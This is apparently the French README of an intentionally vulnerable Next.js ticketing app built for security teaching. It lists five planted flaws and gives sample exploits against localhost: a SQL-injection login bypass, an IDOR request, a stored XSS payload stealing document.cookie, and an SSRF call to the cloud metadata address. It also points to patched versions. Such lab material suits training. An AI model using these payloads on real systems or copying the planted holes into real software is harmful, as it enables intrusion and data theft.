# TicketApp — Application de gestion de tickets volontairement vulnérable

> **Avertissement :** Cette application contient des vulnérabilités intentionnelles à des fins pédagogiques.  
> **Ne jamais déployer en production.**

## Stack technique

- **Framework :** Next.js 14 (App Router)
- **Base de données :** SQLite (better-sqlite3)
- **Authentification :** JWT (jsonwebtoken)
- **Style :** Tailwind CSS
- **CI/CD :** GitHub Actions + Semgrep + Gitleaks + npm audit

---

## Installation et démarrage

```bash
# 1. Installer les dépendances
npm install

# 2. Initialiser la base de données (crée les tables + données de test)
node scripts/init-db.js

# 3. Démarrer en développement
npm run dev
```

L'application est accessible sur **http://localhost:3000**

### Comptes de test

| Email | Mot de passe | Rôle |
|-------|-------------|------|
| admin@tickets.local | admin123 | admin |
| alice@example.com | alice123 | user |
| bob@example.com | bob123 | user |

---

## Vulnérabilités implémentées

| ID | Vulnérabilité | OWASP | Fichier principal |
|----|--------------|-------|------------------|
| VLN-01 | SQL Injection | A03:2021 | `app/api/auth/login/route.js` |
| VLN-02 | IDOR | A01:2021 | `app/api/tickets/[id]/route.js` |
| VLN-03 | XSS Stocké | A03:2021 | `app/tickets/[id]/page.js` |
| VLN-04 | SSRF | A10:2021 | `app/api/admin/fetch-url/route.js` |
| VLN-05 | Security Misconfiguration | A05:2021 | `.env`, `next.config.js`, plusieurs fichiers |

**Documentation complète :** voir [VULNERABILITIES.md](./VULNERABILITIES.md)

---

## Exploitation rapide

### VLN-01 — SQLi Login bypass
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'\''\ OR '\''1'\''='\''1'\''\ --", "password": "x"}'
```

### VLN-02 — IDOR ticket d'un autre utilisateur
```bash
# Se connecter en tant qu'alice, lire le ticket de bob
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"alice123"}' | jq -r '.token')

curl http://localhost:3000/api/tickets/2 \
  -H "Authorization: Bearer $TOKEN"
```

### VLN-03 — XSS Stocké
Dans le formulaire de commentaire, insérer :
```html
<img src=x onerror="alert(document.cookie)">
```

### VLN-04 — SSRF
```bash
curl -X POST http://localhost:3000/api/admin/fetch-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

---

## Versions corrigées

Les corrections sont dans le dossier `secure/` :

| Fichier | Vulnérabilité corrigée |
|---------|----------------------|
| `secure/api/auth/login.js` | SQLi, passwords bcrypt, stack traces |
| `secure/api/tickets/[id].js` | IDOR avec vérification propriétaire |
| `secure/api/admin/fetch-url.js` | SSRF avec liste blanche + DNS check |
| `secure/TicketDetail.secure.jsx` | XSS avec DOMPurify |
| `secure/next.config.secure.js` | Headers de sécurité complets |
